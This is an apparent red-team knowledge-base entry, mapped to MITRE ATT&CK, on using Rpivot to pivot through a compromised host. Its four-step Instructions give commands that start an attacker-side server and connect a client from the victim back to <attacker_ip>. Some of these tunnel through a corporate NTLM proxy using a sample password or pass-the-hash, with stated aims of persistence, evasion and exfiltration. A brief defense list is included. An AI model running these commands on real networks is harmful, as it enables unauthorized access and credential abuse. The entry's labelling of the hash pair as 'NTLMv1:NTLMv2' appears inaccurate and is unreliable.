---
id: abf1ed3d-b869-4709-9f6e-8369958744d1
type: procedure
name: Rpivot-Network-Pivoting
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.876678+00:00'
updated_at: '2023-04-10T20:25:21.394156+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Connection Proxy|T1090 - Connection Proxy]]'
sub_techniques: []
tags:
  - '[[tags/Network Pivoting Techniques]]'
  - '[[tags/Rpivot]]'
  - network-pivoting
  - proxy
  - ntlm
commands:
  - '[[commands/rpivot-start-server]]'
  - '[[commands/rpivot-start-client]]'
  - '[[commands/rpivot-client-ntlm-password]]'
  - '[[commands/rpivot-client-ntlm-hash]]'
platforms:
  - Linux
  - Windows
tools: []
validated: true
---

# Rpivot-Network-Pivoting

## Summary

Rpivot is a Python-based network pivoting technique that enables attackers to maintain persistence in a compromised network by establishing a proxy connection from the attacker's machine to a compromised host, allowing traffic forwarding through corporate proxies and supporting authentication via passwords or pass-the-hash to evade detection.

## Description

Rpivot facilitates lateral movement and command-and-control operations by setting up a proxy server on the attacker's system that listens for connections from a client on the compromised machine. Once connected, traffic is forwarded via the corporate proxy, enabling access to internal network resources. This approach is particularly useful for persisting after initial access detection, as it leverages legitimate proxy infrastructure. It supports NTLM authentication, including pass-the-hash variants, to authenticate without plaintext passwords. The technique targets environments with NTLM-enabled proxies and assumes the attacker has initial shell access on the compromised host to run the client script.

## Requirements

1. Shell access on a compromised host within the target network to execute the client script.
2. Python 3 installed on both attacker and compromised machines.
3. Access to corporate proxy details (IP, port, domain, credentials or hashes).
4. Rpivot source files (server.py and client.py) downloaded on the attacker machine and transferred to the compromised host.
5. Network connectivity allowing outbound connections from the compromised host to the attacker's server port.

## Defense

- Monitor network traffic for unusual proxy connections and anomalous outbound traffic patterns from internal hosts.
- Implement multi-factor authentication (MFA) to mitigate pass-the-hash attacks and enforce least-privilege for proxy access.
- Use network segmentation to restrict lateral movement and deploy proxy logging to detect unauthorized forwarding.
- Enable endpoint detection and response (EDR) tools to identify execution of unknown Python scripts on compromised hosts.

## Objectives

1. Establish a persistent proxy tunnel through a compromised host to access internal network resources.
2. Evade detection by routing traffic via legitimate corporate proxies using NTLM authentication.
3. Enable command-and-control and data exfiltration from segmented network areas.

## Instructions

### Step 1: Start the Rpivot Proxy Server

**Context**: On the attacker's machine, launch the Rpivot server to listen for incoming client connections and forward traffic to the corporate proxy. This sets up the listening ports for proxy requests and server communication.

**Command** ([[commands/rpivot-start-server]]):
```bash
python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
```

> This command initializes the proxy server, binding to all interfaces (0.0.0.0) on port 9443 for client connections and port 1080 for SOCKS proxy traffic. It allows the server to accept connections and relay them appropriately. Expected behavior includes log output confirming the server is listening on the specified ports.

### Step 2: Connect Basic Client from Compromised Host

**Context**: Transfer the client.py script to the compromised host and connect it to the attacker's server. This establishes the initial tunnel without proxy authentication, suitable for direct connectivity scenarios.

**Command** ([[commands/rpivot-start-client]]):
```bash
python client.py --server-ip <attacker_ip> --server-port 9443
```

> Replace <attacker_ip> with the IP address of the attacker's machine. This connects the client to the server, enabling basic pivoting. Success is indicated by connection logs on both ends, with no errors in establishing the TCP session.

### Step 3: Connect Client via Corporate Proxy with Password Authentication

**Context**: If the compromised host must route through a corporate NTLM proxy, use this step to authenticate with domain credentials. This hides the connection within normal proxy traffic.

**Command** ([[commands/rpivot-client-ntlm-password]]):
```bash
python client.py --server-ip <attacker_ip> --server-port 9443 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

> Substitute placeholders: <attacker_ip> for server IP, <proxy_ip> for proxy IP, and use actual domain, username, and password. The client authenticates to the proxy and tunnels to the server. Expected output includes successful NTLM handshake logs and proxy connection confirmation.

### Step 4: Connect Client via Corporate Proxy with Pass-the-Hash Authentication

**Context**: For scenarios where only NTLM hashes are available (e.g., from credential dumping), use pass-the-hash to authenticate without plaintext passwords, further evading detection.

**Command** ([[commands/rpivot-client-ntlm-hash]]):
```bash
python client.py --server-ip <attacker_ip> --server-port 9443 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CORP --username jdoe --hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
```

> Replace placeholders as in Step 3, and insert valid NTLMv1:NTLMv2 hashes. This performs pass-the-hash over NTLM, establishing the tunnel. Success is shown by authentication success in logs without password exposure.
